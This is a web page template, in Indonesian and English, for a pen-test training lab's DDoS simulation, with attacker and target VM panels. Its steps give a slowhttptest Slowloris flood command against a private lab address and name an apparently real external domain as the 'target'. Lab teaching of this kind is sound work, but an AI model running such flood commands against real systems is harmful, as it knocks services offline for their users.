{% extends "layout/base.html" %}

{% block title %}DDOS Simulation - Virtual Pen Test Lab{% endblock %}

{% block content %}
<div class="p-4">
    <div class="flex flex-col md:flex-row justify-between items-center mb-6">
        <div>
            <h1 class="text-3xl font-bold">DDOS Attack Simulation</h1>
            <p class="text-base-content/70">Simulasi serangan Distributed Denial of Service (DDoS).</p>
        </div>
    </div>

    <div class="flex flex-col lg:flex-row gap-6">
        <!-- LEFT COLUMN: STEPS -->
        <aside class="w-full lg:w-1/3">
            <div class="card bg-base-100 shadow-xl">
                <div class="card-body p-4">
                    <h3 class="card-title text-lg mb-4">Guide Instructions</h3>

                    <div class="space-y-4">
                        <div class="collapse collapse-arrow border border-base-300 bg-base-100 rounded-box">
                            <input type="checkbox" checked="checked" />
                            <div class="collapse-title text-xl font-medium">
                                1. Start Virtual Machine
                            </div>
                            <div class="collapse-content">
                                <p>Pada tahap ini silahkan hidupkan virtual machine di panel kanan.</p>
                            </div>
                        </div>

                        <div class="collapse collapse-arrow border border-base-300 bg-base-100 rounded-box">
                            <input type="checkbox" />
                            <div class="collapse-title text-xl font-medium">
                                2. Identify Target
                            </div>
                            <div class="collapse-content">
                                <p>Target yang akan diserang adalah <span class="badge">https.www.asaas.com</span>.</p>
                            </div>
                        </div>

                        <div class="collapse collapse-arrow border border-base-300 bg-base-100 rounded-box">
                            <input type="checkbox" />
                            <div class="collapse-title text-xl font-medium">
                                3. Check IP Address
                            </div>
                            <div class="collapse-content">
                                <p>Lakukan pengecekan IP target menggunakan perintah:</p>
                                <div class="mockup-code bg-base-300 text-base-content mt-2">
                                    <pre data-prefix="$"
                                        class="whitespace-pre-wrap break-all"><code>ping website.com</code></pre>
                                </div>
                            </div>
                        </div>

                        <div class="collapse collapse-arrow border border-base-300 bg-base-100 rounded-box">
                            <input type="checkbox" />
                            <div class="collapse-title text-xl font-medium">
                                4. Pre-exploitation
                            </div>
                            <div class="collapse-content">
                                <p>Gunakan tools <strong>slowhttptest</strong> untuk membanjiri traffic.</p>
                                <p class="mt-2">Run command:</p>
                                <div class="mockup-code bg-base-300 text-base-content mt-2 max-w-full overflow-x-auto">
                                    <pre class="whitespace-pre-wrap break-all"
                                        data-prefix="$"><code>slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://192.168.1.202/index.php -x 24 -p 3</code></pre>
                                </div>
                            </div>
                        </div>

                        <div class="collapse collapse-arrow border border-base-300 bg-base-100 rounded-box">
                            <input type="checkbox" />
                            <div class="collapse-title text-xl font-medium">
                                5. Tool Explanation
                            </div>
                            <div class="collapse-content">
                                <div class="overflow-x-auto">
                                    <table class="table table-xs">
                                        <thead>
                                            <tr>
                                                <th>Param</th>
                                                <th>Fungsi</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <tr>
                                                <td>-c 1000</td>
                                                <td>1000 koneksi</td>
                                            </tr>
                                            <tr>
                                                <td>-H</td>
                                                <td>Slowloris mode</td>
                                            </tr>
                                            <tr>
                                                <td>-p 3</td>
                                                <td>Durasi 3 menit</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>

                        <div class="collapse collapse-arrow border border-base-300 bg-base-100 rounded-box">
                            <input type="checkbox" />
                            <div class="collapse-title text-xl font-medium">
                                6. Exploitation
                            </div>
                            <div class="collapse-content">
                                <p>Jalankan perintah serangan dan amati respon server.</p>
                            </div>
                        </div>

                        <div class="collapse collapse-arrow border border-base-300 bg-base-100 rounded-box">
                            <input type="checkbox" />
                            <div class="collapse-title text-xl font-medium">
                                7. Analysis
                            </div>
                            <div class="collapse-content">
                                <p>Deskripsikan hasil percobaan dan dampaknya pada server.</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </aside>

        <!-- RIGHT COLUMN: VM PREVIEW -->
        <main class="w-full lg:w-2/3">
            <div class="grid grid-cols-1 gap-6">
                <!-- Attacker Box -->
                <div class="card bg-base-100 shadow-xl">
                    <div class="card-body p-4">
                        <h3 class="card-title text-sm mb-2">Attacker VM (Kali Linux)</h3>
                        <div id="attacker-vm-container"
                            class="bg-base-300 h-96 rounded-box flex items-center justify-center relative overflow-hidden">
                            <div class="text-center text-base-content/50">
                                <p>VM is ready</p>
                            </div>
                        </div>
                        <div class="card-actions justify-center mt-4">
                            <button class="btn btn-primary btn-sm"
                                onclick="startVM('attacker-vm-container', '{{ attacker_url }}', 'ddos', 'attacker')">
                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24"
                                    fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                                    stroke-linejoin="round">
                                    <polygon points="5 3 19 12 5 21 5 3"></polygon>
                                </svg>
                                Start VM
                            </button>
                        </div>
                    </div>
                </div>

                <!-- Target Box -->
                <div class="card bg-base-100 shadow-xl">
                    <div class="card-body p-4">
                        <h3 class="card-title text-sm mb-2">Target VM (Server)</h3>
                        <div id="target-vm-container"
                            class="bg-base-300 h-96 rounded-box flex items-center justify-center relative overflow-hidden">
                            <div class="text-center text-base-content/50">
                                <p>VM is ready</p>
                            </div>
                        </div>
                        <div class="card-actions justify-center mt-4 gap-2">
                            <button class="btn btn-primary btn-sm"
                                onclick="startVM('target-vm-container', '{{ target_url }}', 'ddos')">
                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24"
                                    fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                                    stroke-linejoin="round">
                                    <polygon points="5 3 19 12 5 21 5 3"></polygon>
                                </svg>
                                Start VM
                            </button>
                            <button class="btn btn-warning btn-sm" onclick="resetVM('ddos')">
                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24"
                                    fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                                    stroke-linejoin="round">
                                    <path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"></path>
                                    <path d="M3 3v5h5"></path>
                                </svg>
                                Reset VM
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    </div>
</div>
{% endblock %}